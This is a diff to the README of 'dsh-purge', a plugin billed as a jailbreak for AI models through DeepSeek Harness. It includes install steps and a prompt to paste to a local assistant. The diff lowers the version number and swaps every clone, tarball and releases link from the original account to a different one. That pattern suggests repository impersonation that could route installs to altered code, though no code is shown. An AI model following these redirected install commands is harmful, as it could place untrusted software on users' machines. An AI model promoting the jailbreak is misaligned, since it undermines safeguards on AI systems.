@@ -4,7 +4,7 @@
 
 <h1 align="center">⚔️ DeepSeek Harness prompt &amp; patch cleaning tool (dsh-purge)</h1>
 
-<p align="center"><strong>Version 1.2.3 · personal trimmed build (自用版)</strong></p>
+<p align="center"><strong>Version 1.1.56 · personal trimmed build (自用版)</strong></p>
 
 <p align="center">
   <em>DeepSeek Harness jailbreak: every model, swap prompts per model. Default prompt for 小码酱. Please star ⭐ If you build on this, see Attribution required.</em>
@@ -237,7 +237,7 @@ Paste the block below to a local assistant. It should only run the install comma
 
 Install the DeepSeek Harness plugin `dsh-purge` into both the Web profile and the official desktop profile. Do not scan the whole disk, do not read or edit other files, do not apply settings, and do not restart the app.
 
-If `dsh` is not on PATH, tell the user and stop. If this directory is already a clone, use `.` instead of the package name in both commands. If the npm registry is blocked, use `https://github.com/YuJunZhiXue/dsh-purge/archive/refs/heads/master.tar.gz`. If one profile is missing, skip that command and still install the other.
+If `dsh` is not on PATH, tell the user and stop. If this directory is already a clone, use `.` instead of the package name in both commands. If the npm registry is blocked, use `https://github.com/123ada11f/dsh-purge/archive/refs/heads/master.tar.gz`. If one profile is missing, skip that command and still install the other.
 
 **Web (official `dsh web`)**
 
@@ -286,10 +286,10 @@ $cands | Select-Object -Unique | Where-Object { $_ -and (Test-Path (Join-Path $_
 **2. Put the plugin at `$DSH_HOME/plugins/dsh-purge`** (folder must be named `dsh-purge`, with a `package.json` whose `"name"` is `dsh-purge`).
 
 ```sh
-git clone https://github.com/YuJunZhiXue/dsh-purge.git "$DSH_HOME/plugins/dsh-purge"
+git clone https://github.com/123ada11f/dsh-purge.git "$DSH_HOME/plugins/dsh-purge"
 ```
 
-Without git: download [master.tar.gz](https://github.com/YuJunZhiXue/dsh-purge/archive/refs/heads/master.tar.gz), extract, rename `dsh-purge-master` → `dsh-purge`, and place it under `plugins`. If you already have a clone, copy the whole tree — not a few `.js` files.
+Without git: download [master.tar.gz](https://github.com/123ada11f/dsh-purge/archive/refs/heads/master.tar.gz), extract, rename `dsh-purge-master` → `dsh-purge`, and place it under `plugins`. If you already have a clone, copy the whole tree — not a few `.js` files.
 
 **3. Edit only that profile's `package.json` — back it up first.** Web → `$DSH_HOME/profiles/web/package.json`; desktop → `$DSH_HOME/profiles/desktop/package.json`. Add **only two things**, keeping every existing dependency and bundle:
 
@@ -595,7 +595,7 @@ If nothing is found, set `DSH_BASE` / `DSH_DESKTOP_INSTALL`. No files are change
 
 ## Releases
 
-What changed, and the zip, are on [Releases](https://github.com/YuJunZhiXue/dsh-purge/releases). To publish, bump the version in `package.json`, write Chinese and English notes in `release-notes.md`, and push `master`. Pushing the same version again does not publish another package.
+What changed, and the zip, are on [Releases](https://github.com/123ada11f/dsh-purge/releases). To publish, bump the version in `package.json`, write Chinese and English notes in `release-notes.md`, and push `master`. Pushing the same version again does not publish another package.
 
 ## Notes
 
